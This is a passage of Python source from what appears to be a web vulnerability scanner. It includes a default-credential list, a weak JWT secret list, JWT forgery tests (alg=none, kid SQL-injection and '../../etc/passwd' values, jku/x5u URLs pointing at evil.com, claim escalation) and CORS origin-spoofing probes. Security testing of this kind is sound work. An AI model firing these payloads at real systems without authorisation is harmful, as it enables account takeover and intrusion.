    "id":        ["sqli_error", "sqli_blind_time"],
    "xml":       ["xxe"],
    "data":      ["xxe", "ssti"],
    "body":      ["xxe"],
}


# ══════════════════════════════════════════════════════════════════════════════
# SCAN FINDING
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ScanFinding:
    id:             str
    url:            str
    method:         str
    param:          str
    param_type:     str
    vuln_type:      str
    owasp_category: str
    cwe:            str
    finding:        str
    severity:       str
    proof:          str
    payload:        str
    evidence_id:    Optional[str]
    remediation:    str
    chain_id:         Optional[str]          = None
    chain_desc:       Optional[str]          = None
    resp_time_ms:     float                  = 0.0
    baseline_time_ms: float                  = 0.0
    time_delta_ms:    float                  = 0.0
    status_code:      int                    = 0
    confidence_level: AuditIssueConfidence   = field(
        default_factory=lambda: AuditIssueConfidence.TENTATIVE
    )
    ts:               str                    = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self) -> dict:
        return {
            "id":             self.id,
            "url":            self.url,
            "method":         self.method,
            "param":          self.param,
            "param_type":     self.param_type,
            "vuln_type":      self.vuln_type,
            "owasp_category": self.owasp_category,
            "cwe":            self.cwe,
            "finding":        self.finding,
            "severity":       self.severity,
            "proof":          self.proof[:500] if self.proof else "",
            "payload":        self.payload,
            "evidence_id":    self.evidence_id,
            "remediation":    self.remediation,
            "chain_id":         self.chain_id,
            "chain_desc":       self.chain_desc,
            "resp_time_ms":     self.resp_time_ms,
            "baseline_time_ms": self.baseline_time_ms,
            "time_delta_ms":    self.time_delta_ms,
            "status_code":      self.status_code,
            "confidence_level": self.confidence_level.value,
            "ts":               self.ts,
        }


# ══════════════════════════════════════════════════════════════════════════════
# VULNERABILITY SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class VulnerabilityScanner:
    """
    Master DAST scanner. Orchestrates all passive + active checks.
    Call scan(sitemap) to run everything and get back a list of ScanFindings.
    """

    DEFAULT_CREDS = [
        ("admin",  "admin"),
        ("admin",  "password"),
        ("admin",  "123456"),
        ("admin",  "admin123"),
        ("admin",  ""),
        ("root",   "root"),
        ("root",   "toor"),
        ("root",   ""),
        ("test",   "test"),
        ("guest",  "guest"),
        ("user",   "user"),
        ("admin",  "letmein"),
        ("admin",  "Welcome1"),
        ("admin",  "changeme"),
    ]

    WEAK_JWT_SECRETS = [
        # Common defaults
        "secret", "password", "key", "jwt", "123456", "secret123", "supersecret",
        # Framework defaults
        "changeme", "changeit", "your-256-bit-secret", "my-secret-key",
        "default", "test", "admin", "letmein", "qwerty", "1234567890",
        # Common developer passwords
        "abc123", "iloveyou", "welcome", "monkey", "master",
        # JWT-specific common secrets
        "jwt-secret", "jwt_secret", "token-secret", "auth-secret",
        "hmac-secret", "signing-key", "private-key", "my-jwt-secret",
        # Short / trivial
        "a", "1", "pass", "test123", "hello",
    ]

    JS_CVE_PATTERNS = [
        (re.compile(r"jquery[.-v]*((?:1\.[0-9]\.|2\.[0-2]\.)\d+)", re.I),
         "jQuery {v} < 3.5.0 — CVE-2020-11022 XSS via .html()/.append()", "supply_chain"),
        (re.compile(r"bootstrap[.-v]*((?:2\.|3\.|4\.[0-2]\.)\d+)", re.I),
         "Bootstrap {v} < 4.3.1 — CVE-2019-8331 XSS via data-* attributes", "supply_chain"),
        (re.compile(r"angular(?:\.min)?\.js[^\"']*(1\.\d+\.\d+)", re.I),
         "AngularJS 1.x ({v}) — End of Life Dec 2021, multiple XSS CVEs", "supply_chain"),
        (re.compile(r"lodash[.-v]*(4\.(?:1[0-6]|[0-9])\.\d+|[0-3]\.\d+\.\d+)", re.I),
         "Lodash {v} < 4.17.21 — CVE-2021-23337 prototype pollution", "supply_chain"),
        (re.compile(r"moment[.-v]*(\d+\.\d+\.\d+)", re.I),
         "Moment.js {v} — End of Life, unmaintained; consider date-fns / Day.js", "supply_chain"),
    ]

    def __init__(
        self,
        target:     str,
        scope:      ScopeManager,
        session:    requests.Session,
        ev_store:   EvidenceStore | None = None,
        stop_event: threading.Event | None = None,
        on_finding: Callable | None = None,
        timeout:    int = 10,
        rate_limit: float = 0.05,
        oast=None,
        scan_id:    str = "",
        allow_dangerous_endpoints: bool = False,
    ):
        self.target     = target
        self.scope      = scope
        self.session    = session
        self.ev_store   = ev_store or _global_store
        self.scan_id    = scan_id
        self.stop_event = stop_event or threading.Event()
        self.on_finding = on_finding
        self.timeout    = timeout
        self.rate_limit = rate_limit
        self.oast       = oast
        self.allow_dangerous_endpoints = allow_dangerous_endpoints
        self._lock      = threading.Lock()
        self._results:  list[ScanFinding] = []

    @staticmethod
    def _sitemap_with_surfaces(sitemap, surfaces: list):
        view = SimpleNamespace(**getattr(sitemap, "__dict__", {}))
        view.pages = getattr(sitemap, "pages", {})
        view.surfaces = surfaces
        return view

    # ── Public ────────────────────────────────────────────────────────────────

    def scan(self, sitemap) -> list[ScanFinding]:
        """Run all scan phases and return list of ScanFindings."""
        findings: list[ScanFinding] = []
        log.info("SCANNER START target=%s pages=%d surfaces=%d",
                 self.target, len(sitemap.pages), len(sitemap.surfaces))
        active_surfaces = filter_dangerous_surfaces(
            getattr(sitemap, "surfaces", []),
            allow_dangerous_endpoints=self.allow_dangerous_endpoints,
        )
        active_sitemap = self._sitemap_with_surfaces(sitemap, active_surfaces)

        # Phase 1: Passive
        log.debug("Phase 1: passive checks")
        safe_publish(PHASE_STARTED, {"phase": 1, "name": "passive"})
        p1 = self._passive_phase(sitemap)
        safe_publish(PHASE_COMPLETE, {"phase": 1, "name": "passive", "finding_count": len(p1)})
        log.info("Phase 1 done: %d findings", len(p1))
        findings += p1
        if self.stop_event.is_set():
            return findings

        # Phase 2: Active fuzzing
        log.debug("Phase 2: active fuzzing (%d surfaces)", len(active_surfaces))
        safe_publish(PHASE_STARTED, {"phase": 2, "name": "active_fuzz", "surface_count": len(active_surfaces)})
        p2 = self._active_fuzz_phase(active_surfaces)
        safe_publish(PHASE_COMPLETE, {"phase": 2, "name": "active_fuzz", "finding_count": len(p2)})
        log.info("Phase 2 done: %d findings", len(p2))
        findings += p2
        if self.stop_event.is_set():
            return findings

        # Phase 3: Specialized checks (parallelized via ThreadPoolExecutor)
        _phase3_checks = [
            self._check_jwt,
            self._check_cors_active,
            lambda sm: self._check_prototype_pollution(sm.surfaces),
            lambda sm: self._check_exceptional_conditions(sm.surfaces),
            self._check_graphql,
            self._check_websocket,
            self._check_http_smuggling,
            self._check_rate_limiting,
            self._check_supply_chain,
            self._check_default_credentials,
            self._check_dom_xss,
            self._check_dom_xss_active,
            self._check_race_conditions,
            self._check_cookie_scope,
            self._check_security_headers_active,
            self._check_session_security,
            self._check_directory_listing,
            self._check_source_disclosure,
            self._check_cache_deception,
            self._check_method_override,
            self._check_user_enumeration,
            self._check_error_disclosure,
            self._check_mixed_content,
            self._check_insecure_forms,
            self._check_subdomain_takeover,
            self._check_open_api_exposure,
            self._check_trace_xst,
            self._check_csrf_token_strength,
            self._check_file_upload,
            self._check_clickjacking,
            self._check_cors_preflight_cache,
            self._check_hsts_preload,
            self._check_sensitive_data_exposure,
            self._check_weak_tls,
            self._check_weak_ciphers,
            self._check_brute_force_protection,
            self._check_logging_monitoring,
            self._check_sri,
            self._check_supply_chain_runtime,
            self._check_host_header_injection,
            self._check_hpp,
            self._check_nosql_injection,
            self._check_deserialization,
            self._check_ssi_injection,
            self._check_ldap_injection,
            self._check_log_injection,
            self._check_oauth_misconfig,
            self._check_oauth_device_flow,
            self._check_oauth_state_reuse,
            self._check_web_cache_poisoning,
            self._check_cache_poisoning,
            self._check_mass_assignment,
            self._check_business_logic,
            self._check_cert_transparency,
            self._check_http_verb_tampering,
            self._check_padding_oracle,
            self._check_http_smuggling_clte,
            self._check_cors_origin_probe,
            self._check_esi_injection,
            self._check_shellshock,
            self._check_jetty_leak,
            self._check_struts_rce,
            self._check_struts_namespace_rce,
            self._check_rails_file_disclosure,
            self._check_xpath_injection,
            self._check_ssrf_oast,
            # ── Burp extensions digest ─────────────────────────────────────
            self._check_reverse_tabnabbing,
            self._check_jsonp,
            self._check_403_bypass,
            self._check_log4shell,
            self._check_httpoxy,
            self._check_cryptomining,
        ]

        safe_publish(PHASE_STARTED, {"phase": 3, "name": "specialized", "check_count": len(_phase3_checks)})
        try:
            from concurrent.futures import ThreadPoolExecutor, as_completed
            import threading
            _findings_lock = threading.Lock()
            _parallel_findings: list[ScanFinding] = []

            def _run_check(check_fn):
                if self.stop_event.is_set():
                    return []
                name = getattr(check_fn, "__name__", str(check_fn))
                log.debug("CHECK %s", name)
                try:
                    result = check_fn(active_sitemap)
                    if result:
                        log.info("CHECK %s → %d finding(s)", name, len(result))
                    return result
                except Exception as _ce:
                    log.error("CHECK %s FAILED: %s", name, _ce, exc_info=True)
                    return []

            max_workers = min(8, len(_phase3_checks))
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(_run_check, fn): fn for fn in _phase3_checks}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        with _findings_lock:
                            _parallel_findings.extend(result)
            findings += _parallel_findings
            safe_publish(PHASE_COMPLETE, {"phase": 3, "name": "specialized", "finding_count": len(_parallel_findings)})
        except ImportError:
            # Sequential fallback
            for check_fn in _phase3_checks:
                if self.stop_event.is_set():
                    break
                try:
                    findings += check_fn(active_sitemap)
                except Exception:
                    continue

        # Phase 4: Chain analysis
        from .vuln_chainer import VulnChainer
        VulnChainer().analyze_and_annotate(findings)

        # Phase 5: Deduplication
        pre_dedup = len(findings)
        deduplicator = FindingDeduplicator()
        findings = deduplicator.deduplicate([f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        if pre_dedup > len(findings):
            dropped = pre_dedup - len(findings)
            log.info("[Scanner] Dedup removed %d duplicate findings (%d → %d)",
                     dropped, pre_dedup, len(findings))
            safe_publish(FINDING_DEDUPLICATED, {
                "dropped": dropped,
                "before": pre_dedup,
                "after": len(findings),
            })

        return findings

    # ── Phase 1: Passive ─────────────────────────────────────────────────────

    def _passive_phase(self, sitemap) -> list[ScanFinding]:
        scanner = PassiveScanner()
        findings = []
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set():
                break
            _status = page.get("status", 0)
            if _status in (0, 404, 410):
                continue
            pf_list = scanner.scan(
                url=url,
                status_code=page.get("status", 0),
                resp_headers=page.get("headers", {}),
                resp_body="",
                cookies={},
            )
            for pf in pf_list:
                vtype = self._passive_category_to_vuln_type(pf.category, pf.finding)
                sf = self._make_finding(
                    url=url, method="GET", param="", param_type="passive",
                    vuln_type=vtype,
                    finding=pf.finding,
                    severity=pf.severity.lower(),
                    proof=pf.evidence,
                    payload="",
                    evidence_id=None,
                )
                findings.append(sf)
                self._emit(sf)
        return findings

    def _passive_category_to_vuln_type(self, category: str, finding: str) -> str:
        finding_l = finding.lower()
        if "hsts" in finding_l or "strict-transport" in finding_l:
            return "missing_hsts"
        if "content-security-policy" in finding_l or "csp" in finding_l:
            return "missing_csp"
        if "httponly" in finding_l:
            return "missing_httponly"
        if "cors" in finding_l:
            return "cors_medium"
        return "info_disclosure"

    # ── Phase 2: Active fuzz ──────────────────────────────────────────────────

    def _active_fuzz_phase(self, surfaces: list) -> list[ScanFinding]:
        def _on_fuzz_result(fr: FuzzResult):
            sf = self._fuzz_result_to_scan_finding(fr)
            self._emit(sf)

        fuzzer = Fuzzer(
            scope=self.scope,
            session=self.session,
            ev_store=self.ev_store,
            timeout=self.timeout,
            rate_limit=self.rate_limit,
            on_finding=_on_fuzz_result,
            stop_event=self.stop_event,
            scan_id=self.scan_id,
            allow_dangerous_endpoints=self.allow_dangerous_endpoints,
        )

        # Inject context-aware vuln type overrides
        enriched_surfaces = self._enrich_surfaces(surfaces)
        fuzz_results = fuzzer.fuzz_all(enriched_surfaces)

        return [self._fuzz_result_to_scan_finding(fr) for fr in fuzz_results]

    def _enrich_surfaces(self, surfaces: list) -> list:
        """Tag surfaces with context-aware vuln types based on param name."""
        for s in surfaces:
            pname = (s.param or "").lower()
            for key, vtypes in _PARAM_CONTEXT.items():
                if key in pname:
                    # Attach hint — fuzzer will use PARAM_TYPE_MAP, but we tag for reference
                    if not hasattr(s, "_context_vtypes"):
                        s._context_vtypes = vtypes
                    break
        return surfaces

    def _fuzz_result_to_scan_finding(self, fr: FuzzResult) -> ScanFinding:
        return self._make_finding(
            url=fr.url, method=fr.method,
            param=fr.param, param_type=fr.param_type,
            vuln_type=fr.vuln_type,
            finding=fr.finding,
            severity=fr.severity,
            proof=fr.proof or fr.finding,
            payload=fr.payload,
            evidence_id=fr.evidence_id,
            resp_time_ms=fr.resp_time_ms,
            baseline_time_ms=fr.baseline_time_ms,
            time_delta_ms=fr.time_delta_ms,
            status_code=fr.status_code,
            confidence_level=fr.confidence_level,
        )

    # ── JWT checks ────────────────────────────────────────────────────────────

    def _check_jwt(self, sitemap) -> list[ScanFinding]:
        findings = []
        tokens = self._collect_jwts(sitemap)
        for token, source_url in tokens:
            try:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                header_raw = self._b64_decode_jwt(parts[0])
                payload_raw = self._b64_decode_jwt(parts[1])
                header = json.loads(header_raw)
                alg = header.get("alg", "").lower()

                # Test 1: alg=none
                none_token = self._make_alg_none_token(parts[0], parts[1])
                resp = self._req("GET", source_url, headers={"Authorization": f"Bearer {none_token}"})
                if resp and resp.status_code in (200, 201, 204):
                    findings.append(self._make_finding(
                        url=source_url, method="GET", param="Authorization",
                        param_type="header", vuln_type="jwt_alg_none",
                        finding=f"JWT alg=none bypass CONFIRMED — server accepted unsigned token [{source_url}]",
                        severity="critical",
                        proof=f"Original alg: {header.get('alg')} | Modified: none | Status: {resp.status_code}",
                        payload=none_token[:80],
                    ))

                # Test 2: Weak HMAC secret brute force
                if alg in ("hs256", "hs384", "hs512"):
                    for secret in self.WEAK_JWT_SECRETS:
                        try:
                            import hmac as _hmac, hashlib
                            msg = f"{parts[0]}.{parts[1]}".encode()
                            sig_check = base64.urlsafe_b64encode(
                                _hmac.new(secret.encode(), msg, hashlib.sha256).digest()
                            ).rstrip(b"=").decode()
                            if sig_check == parts[2]:
                                findings.append(self._make_finding(
                                    url=source_url, method="GET", param="Authorization",
                                    param_type="header", vuln_type="jwt_weak_secret",
                                    finding=f"JWT weak HMAC secret CONFIRMED — secret='{secret}' [{source_url}]",
                                    severity="critical",
                                    proof=f"Algorithm: {header.get('alg')} | Secret: {secret}",
                                    payload=token[:80],
                                ))
                                break
                        except Exception:
                            continue

                # Test 3: kid header injection
                kid = header.get("kid", "")
                if kid:
                    sqli_kid = "' OR 1=1--"
                    lfi_kid  = "../../etc/passwd"
                    for malicious_kid in (sqli_kid, lfi_kid):
                        new_header = {**header, "kid": malicious_kid}
                        encoded_hdr = base64.urlsafe_b64encode(
                            json.dumps(new_header).encode()
                        ).rstrip(b"=").decode()
                        kid_token = f"{encoded_hdr}.{parts[1]}.{parts[2]}"
                        resp2 = self._req("GET", source_url,
                                          headers={"Authorization": f"Bearer {kid_token}"})
                        if resp2 and "error" not in resp2.text.lower()[:200]:
                            findings.append(self._make_finding(
                                url=source_url, method="GET", param="Authorization:kid",
                                param_type="header", vuln_type="jwt_kid_injection",
                                finding=f"JWT kid header injection — server processed malicious kid [{source_url}]",
                                severity="high",
                                proof=f"Injected kid: {malicious_kid} | Status: {resp2.status_code}",
                                payload=malicious_kid,
                            ))
                            break

                # Test 4: Algorithm confusion (RS256 → HS256)
                # If server uses RSA, attacker can switch to HS256 and sign with public key
                if alg in ("rs256", "rs384", "rs512", "es256", "es384", "es512", "ps256"):
                    confused_header = {**header, "alg": "HS256"}
                    encoded_hdr = base64.urlsafe_b64encode(
                        json.dumps(confused_header).encode()
                    ).rstrip(b"=").decode()
                    # Sign with empty secret (detection: does server accept HS256 when expecting RSA?)
                    import hmac as _hmac
                    msg = f"{encoded_hdr}.{parts[1]}".encode()
                    fake_sig = base64.urlsafe_b64encode(
                        _hmac.new(b"", msg, hashlib.sha256).digest()
                    ).rstrip(b"=").decode()
                    confused_token = f"{encoded_hdr}.{parts[1]}.{fake_sig}"
                    resp3 = self._req("GET", source_url,
                                      headers={"Authorization": f"Bearer {confused_token}"})
                    if resp3 and resp3.status_code in (200, 201, 204):
                        findings.append(self._make_finding(
                            url=source_url, method="GET", param="Authorization:alg",
                            param_type="header", vuln_type="jwt_alg_confusion",
                            finding=f"JWT algorithm confusion — server accepted HS256 token (expected {header.get('alg')}) [{source_url}]",
                            severity="critical",
                            proof=f"Original alg: {header.get('alg')} | Confused to: HS256 | Status: {resp3.status_code}",
                            payload="alg:HS256 confusion",
                        ))

                # Test 5: Signature stripping (send header.payload. with empty sig)
                stripped_token = f"{parts[0]}.{parts[1]}."
                resp4 = self._req("GET", source_url,
                                  headers={"Authorization": f"Bearer {stripped_token}"})
                if resp4 and resp4.status_code in (200, 201, 204):
                    findings.append(self._make_finding(
                        url=source_url, method="GET", param="Authorization",
                        param_type="header", vuln_type="jwt_sig_strip",
                        finding=f"JWT signature stripping — server accepted token without signature [{source_url}]",
                        severity="critical",
                        proof=f"Token: header.payload. (empty signature) | Status: {resp4.status_code}",
                        payload="Empty signature",
                    ))

                # Test 6: jku header injection (set jku to attacker URL)
                if self.oast:
                    oast_url = f"http://{self.oast.domain}/jwt-jku"
                    jku_header = {**header, "jku": oast_url}
                    encoded_jku = base64.urlsafe_b64encode(
                        json.dumps(jku_header).encode()
                    ).rstrip(b"=").decode()
                    jku_token = f"{encoded_jku}.{parts[1]}.{parts[2]}"
                    self._req("GET", source_url,
                              headers={"Authorization": f"Bearer {jku_token}"})
                    # Detection happens via OAST callback — if server fetches jku URL
                else:
                    # Without OAST, just test if server processes jku without error
                    jku_header = {**header, "jku": "https://evil.com/.well-known/jwks.json"}
                    encoded_jku = base64.urlsafe_b64encode(
                        json.dumps(jku_header).encode()
                    ).rstrip(b"=").decode()
                    jku_token = f"{encoded_jku}.{parts[1]}.{parts[2]}"
                    resp5 = self._req("GET", source_url,
                                      headers={"Authorization": f"Bearer {jku_token}"})
                    if resp5 and resp5.status_code in (200, 201, 204):
                        findings.append(self._make_finding(
                            url=source_url, method="GET", param="Authorization:jku",
                            param_type="header", vuln_type="jwt_jku_injection",
                            finding=f"JWT jku injection — server accepted token with attacker-controlled jku [{source_url}]",
                            severity="high",
                            proof=f"Injected jku: https://evil.com/.well-known/jwks.json | Status: {resp5.status_code}",
                            payload="jku:evil.com",
                        ))

                # Test 6b: x5u header injection (x5u points to attacker-controlled X.509 cert URL)
                if self.oast:
                    oast_x5u = f"http://{self.oast.domain}/jwt-x5u"
                    x5u_header = {**header, "x5u": oast_x5u}
                    encoded_x5u = base64.urlsafe_b64encode(
                        json.dumps(x5u_header).encode()
                    ).rstrip(b"=").decode()
                    x5u_token = f"{encoded_x5u}.{parts[1]}.{parts[2]}"
                    self._req("GET", source_url,
                              headers={"Authorization": f"Bearer {x5u_token}"})
                    # Detection via OAST — server fetching x5u URL = confirmed
                else:
                    x5u_header = {**header, "x5u": "https://evil.com/attacker.crt"}
                    encoded_x5u = base64.urlsafe_b64encode(
                        json.dumps(x5u_header).encode()
                    ).rstrip(b"=").decode()
                    x5u_token = f"{encoded_x5u}.{parts[1]}.{parts[2]}"
                    resp_x5u = self._req("GET", source_url,
                                         headers={"Authorization": f"Bearer {x5u_token}"})
                    if resp_x5u and resp_x5u.status_code in (200, 201, 204):
                        findings.append(self._make_finding(
                            url=source_url, method="GET", param="Authorization:x5u",
                            param_type="header", vuln_type="jwt_x5u_injection",
                            finding=f"JWT x5u injection — server accepted token with attacker-controlled x5u cert URL [{source_url}]",
                            severity="high",
                            proof=f"Injected x5u: https://evil.com/attacker.crt | Status: {resp_x5u.status_code}",
                            payload="x5u:evil.com/attacker.crt",
                        ))

                # Test 7: jwk header embedding (embed custom key in JWT header)
                jwk_header = {**header, "jwk": {
                    "kty": "oct", "k": base64.urlsafe_b64encode(b"attacker-key").rstrip(b"=").decode(),
                }}
                encoded_jwk = base64.urlsafe_b64encode(
                    json.dumps(jwk_header).encode()
                ).rstrip(b"=").decode()
                import hmac as _hmac2
                msg_jwk = f"{encoded_jwk}.{parts[1]}".encode()
                sig_jwk = base64.urlsafe_b64encode(
                    _hmac2.new(b"attacker-key", msg_jwk, hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                jwk_token = f"{encoded_jwk}.{parts[1]}.{sig_jwk}"
                resp6 = self._req("GET", source_url,
                                  headers={"Authorization": f"Bearer {jwk_token}"})
                if resp6 and resp6.status_code in (200, 201, 204):
                    findings.append(self._make_finding(
                        url=source_url, method="GET", param="Authorization:jwk",
                        param_type="header", vuln_type="jwt_jku_injection",
                        finding=f"JWT jwk embedding — server accepted token with embedded attacker key [{source_url}]",
                        severity="critical",
                        proof=f"Embedded jwk with attacker key | Status: {resp6.status_code}",
                        payload="jwk:embedded-key",
                    ))

                # Test 8: Expired token replay
                try:
                    payload_obj = json.loads(payload_raw)
                    exp = payload_obj.get("exp")
                    if exp and isinstance(exp, (int, float)) and exp < time.time():
                        # Token is already expired — just replay it
                        resp7 = self._req("GET", source_url,
                                          headers={"Authorization": f"Bearer {token}"})
                        if resp7 and resp7.status_code in (200, 201, 204):
                            findings.append(self._make_finding(
                                url=source_url, method="GET", param="Authorization",
                                param_type="header", vuln_type="jwt_expired_accept",
                                finding=f"JWT expired token accepted — exp={exp} is in the past [{source_url}]",
                                severity="medium",
                                proof=f"exp: {exp} | Current time: {int(time.time())} | Status: {resp7.status_code}",
                                payload=f"Expired JWT (exp={exp})",
                            ))
                except Exception:
                    pass

                # Test 9: Claim tampering (escalate role/admin)
                try:
                    payload_obj = json.loads(payload_raw)
                    tampered = False
                    for claim, value in [("admin", True), ("role", "admin"),
                                          ("is_admin", True), ("scope", "admin"),
                                          ("permissions", ["*"])]:
                        if claim in payload_obj and payload_obj[claim] != value:
                            payload_obj[claim] = value
                            tampered = True
                    if tampered:
                        new_payload = base64.urlsafe_b64encode(
                            json.dumps(payload_obj).encode()
                        ).rstrip(b"=").decode()
                        tampered_token = f"{parts[0]}.{new_payload}.{parts[2]}"
                        resp8 = self._req("GET", source_url,
                                          headers={"Authorization": f"Bearer {tampered_token}"})
                        if resp8 and resp8.status_code in (200, 201, 204):
                            findings.append(self._make_finding(
                                url=source_url, method="GET", param="Authorization:claims",
                                param_type="header", vuln_type="jwt_claim_tamper",
                                finding=f"JWT claim tampering — server accepted token with escalated claims [{source_url}]",
                                severity="high",
                                proof=f"Modified claims: admin/role/is_admin → admin | Status: {resp8.status_code}",
                                payload="Claim escalation",
                            ))
                except Exception:
                    pass

            except Exception:
                continue
        return findings

    def _collect_jwts(self, sitemap) -> list[tuple[str, str]]:
        """Collect JWTs from headers, cookies, and response bodies."""
        tokens = []
        seen = set()
        jwt_pattern = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        for url, page in sitemap.pages.items():
            # Check response headers stored during crawl
            hdrs = page.get("headers", {})
            for hdr_val in hdrs.values():
                if isinstance(hdr_val, str):
                    for m in jwt_pattern.finditer(hdr_val):
                        tok = m.group(0)
                        if tok not in seen:
                            tokens.append((tok, url))
                            seen.add(tok)
            # Also fetch page and check body + Set-Cookie for JWTs
            if len(tokens) < 10:  # limit JWT collection effort
                try:
                    resp = self._req("GET", url)
                    if resp:
                        # Check response body
                        for m in jwt_pattern.finditer(resp.text[:16000]):
                            tok = m.group(0)
                            if tok not in seen:
                                tokens.append((tok, url))
                                seen.add(tok)
                        # Check cookies
                        for cookie_val in resp.headers.get("Set-Cookie", "").split(","):
                            for m in jwt_pattern.finditer(cookie_val):
                                tok = m.group(0)
                                if tok not in seen:
                                    tokens.append((tok, url))
                                    seen.add(tok)
                except Exception:
                    pass
        return tokens

    @staticmethod
    def _b64_decode_jwt(segment: str) -> bytes:
        pad = 4 - len(segment) % 4
        return base64.urlsafe_b64decode(segment + "=" * (pad % 4))

    @staticmethod
    def _make_alg_none_token(header_b64: str, payload_b64: str) -> str:
        none_hdr = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
        return f"{none_hdr}.{payload_b64}."

    # ── CORS active ───────────────────────────────────────────────────────────

    def _check_cors_active(self, sitemap) -> list[ScanFinding]:
        """
        Comprehensive CORS misconfiguration testing — ZAP+ parity.

        Tests:
        1. Origin reflection — 14 origin variants (evil.com, null, subdomain,
           protocol downgrade, post-domain bypass, internal, encoded, backtick)
        2. Pre-flight OPTIONS — custom headers/methods allowed?
        3. Vary: Origin missing — CORS cache poisoning risk
        4. Access-Control-Expose-Headers — sensitive headers exposed?
        5. Access-Control-Max-Age — excessive pre-flight cache lifetime?
        """
        findings = []
        parsed = urlparse(self.target)
        target_host = parsed.hostname or parsed.netloc
        target_scheme = parsed.scheme

        # ── 14 origin variants ──
        test_origins = [
            # Basic reflection
            "https://evil.com",
            "null",
            # Subdomain suffix/prefix bypass
            f"https://{target_host}.evil.com",
            f"https://evil.{target_host}",
            # Protocol downgrade (http on https target)
            f"http://{target_host}",
            # Post-domain character bypass (some parsers stop at certain chars)
            f"https://{target_host}%60evil.com",
            f"https://{target_host}.evil.com",
            f"https://{target_host}@evil.com",
            # Regex bypass variants
            f"https://not{target_host}",
            f"https://{target_host}evil.com",
            # Internal network origins
            "https://localhost",
            "https://127.0.0.1",
            "http://169.254.169.254",
            # Encoded / special origins
            "https://evil%2Ecom",
        ]

        seen_urls = set()
        flagged_cors = False

        for url in list(sitemap.pages.keys())[:10]:
            if url in seen_urls or self.stop_event.is_set():
                continue
            seen_urls.add(url)

            # ── Test 1: Origin reflection with each variant ──
            for origin in test_origins:
                if self.stop_event.is_set() or flagged_cors:
                    break
                try:
                    resp = self._req("GET", url, headers={"Origin": origin})
                    if not resp:
                        continue
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

                    if acao == origin and acac == "true":
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_critical",
                            finding=(
                                f"CORS CRITICAL — reflects Origin '{origin}' with "
                                f"credentials=true [{url}]"
                            ),
                            severity="critical",
                            proof=f"ACAO: {acao} | ACAC: {acac}",
                            payload=origin,
                        ))
                        flagged_cors = True
                    elif acao == origin:
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_medium",
                            finding=f"CORS reflects arbitrary origin '{origin}' [{url}]",
                            severity="medium",
                            proof=f"ACAO: {acao}",
                            payload=origin,
                        ))
                    elif acao == "*" and acac == "true":
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Origin",
                            param_type="header", vuln_type="cors_critical",
                            finding=f"CORS wildcard + credentials=true — invalid but dangerous [{url}]",
                            severity="critical",
                            proof=f"ACAO: {acao} | ACAC: {acac}",
                            payload=origin,
                        ))
                        flagged_cors = True
                except Exception:
                    continue

            # ── Test 2: Pre-flight OPTIONS probe ──
            try:
                preflight_resp = self._req("OPTIONS", url, headers={
                    "Origin": "https://evil.com",
                    "Access-Control-Request-Method": "DELETE",
                    "Access-Control-Request-Headers": "X-Custom-Header, Authorization",
                })
                if preflight_resp:
                    acao_pf = preflight_resp.headers.get("Access-Control-Allow-Origin", "")
                    acam_pf = preflight_resp.headers.get("Access-Control-Allow-Methods", "")
                    acah_pf = preflight_resp.headers.get("Access-Control-Allow-Headers", "")

                    # Dangerous: allows DELETE/PUT from any origin
                    if acao_pf in ("*", "https://evil.com") and ("DELETE" in acam_pf or "PUT" in acam_pf):
                        findings.append(self._make_finding(
                            url=url, method="OPTIONS", param="Origin",
                            param_type="header", vuln_type="cors_preflight",
                            finding=f"CORS pre-flight allows dangerous methods from arbitrary origin [{url}]",
                            severity="medium",
                            proof=f"ACAO: {acao_pf} | ACAM: {acam_pf}",
                            payload="OPTIONS + DELETE",
                        ))

                    # Dangerous: allows Authorization header from any origin
                    if acao_pf in ("*", "https://evil.com") and "authorization" in acah_pf.lower():
                        findings.append(self._make_finding(
                            url=url, method="OPTIONS", param="Origin",
                            param_type="header", vuln_type="cors_preflight",
                            finding=f"CORS pre-flight allows Authorization header from arbitrary origin [{url}]",
                            severity="high",
                            proof=f"ACAO: {acao_pf} | ACAH: {acah_pf}",
                            payload="OPTIONS + Authorization",
                        ))
            except Exception:
                pass

            # ── Test 3: Vary: Origin missing (cache poisoning) ──
            try:
                # Send two requests with different Origins, check Vary header
                resp1 = self._req("GET", url, headers={"Origin": f"https://{target_host}"})
                if resp1:
                    acao1 = resp1.headers.get("Access-Control-Allow-Origin", "")
                    vary = resp1.headers.get("Vary", "")
                    if acao1 and acao1 != "*" and "origin" not in vary.lower():
                        findings.append(self._make_finding(
                            url=url, method="GET", param="Vary",
                            param_type="header", vuln_type="cors_cache_poison",
                            finding=f"CORS response missing 'Vary: Origin' — cache poisoning risk [{url}]",
                            severity="medium",
                            proof=f"ACAO: {acao1} | Vary: {vary or '(absent)'}",
                            payload="Vary: Origin missing",
                        ))
            except Exception:
                pass

            # ── Test 4: Sensitive headers exposed via Access-Control-Expose-Headers ──
            try:
                resp_hdr = self._req("GET", url, headers={"Origin": f"https://{target_host}"})
                if resp_hdr:
                    aceh = resp_hdr.headers.get("Access-Control-Expose-Headers", "")
                    if aceh:
                        sensitive_exposed = []
                        for sh in ("Authorization", "Set-Cookie", "X-API-Key",
                                   "X-Auth-Token", "Cookie", "X-CSRF-Token"):
                            if sh.lower() in aceh.lower():
                                sensitive_exposed.append(sh)
                        if sensitive_exposed:
                            findings.append(self._make_finding(
                                url=url, method="GET", param="Expose-Headers",
                                param_type="header", vuln_type="cors_medium",
                                finding=f"CORS exposes sensitive headers: {', '.join(sensitive_exposed)} [{url}]",
                                severity="medium",
                                proof=f"ACEH: {aceh}",
